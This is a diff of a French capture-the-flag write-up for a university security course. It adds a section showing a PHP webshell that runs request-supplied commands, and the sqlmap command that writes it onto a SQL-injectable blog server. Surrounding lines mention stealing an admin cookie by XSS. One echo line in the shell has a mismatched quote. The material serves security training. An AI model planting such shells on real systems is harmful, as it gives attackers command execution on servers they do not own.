@@ -1,5 +1,3 @@
-
-
 # SRS Capture The Flag
 Dans le cadre de l'UV SRS à l'IMT Lille Douai, Advens nous a proposé de participé à un CTF (Capture The Flag) afin de nous former aux techniques de ethical hacking.
 Ce document nous permettra d'expliquer les méthodes que nous avons employé pour résoudre les différents challenges de ce CTF. 
@@ -49,6 +47,26 @@ Cependant, le serveur étant en "maintenance", les messages d'injection XSS de t
 </script>
 ```
 Grâce au site [Request Inspector](https://requestinspector.com/) nous allons pouvoir récupérer le resultat de notre script et donc récupérer le cookie administrateur. [[screenshot]](https://raw.githubusercontent.com/migonidec/SRS_CTF/master/images/web/cookieHacker/cookieHacker_2.PNG). Ensuite l'extension [Cookie Quick Manager](https://addons.mozilla.org/fr/firefox/addon/cookie-quick-manager/) nous permet d’éditer les cookies et d'injecter notre cookie volé. Une fois le cookie re-injecté, on obtient le flag du challenge.
+
+### Le Blog de Michel
+Ce blog interroge une base de donnée pour aller chercher ses articles grâce à une structure d'url `http://url/?page=blog&id=1`. Grâce à `sqlmap` nous allons voir s'il est possible de réaliser une injection SQL [[screenshot]](https://raw.githubusercontent.com/migonidec/SRS_CTF/master/images/web/blogMichel/blogMichel_1.PNG).
+
+Une fois la faille SQL identifié, nous allons injecter un shell dans le serveur cible afin de pouvoir interagir avec lui. 
+```
+> cat /root/simpleShell.php
+<?php
+	if(isset($_REQUEST['cmd'])){
+		echo "<pre>";
+		$cmd = ($_REQUEST['cmd']);
+		system($cmd);
+		echo "<pre>';
+		die;
+	}
+?>
+
+> sqlmap -u http://blogdemichel.hackdumb.com/?page=blog\&id=1 --file-dest="../../../../../../tmp/simpleShell.php" --file-write="/root/simpleShell.php"
+``` 
+Grâce à ce webshell on peux interagir avec le serveur et localiser le flag dans `/home/michel`. A noter qu'on utilise l’exécutable `getflag` qui peut être exécuté par tout les utilisateurs.
 
 ## Forensic
 
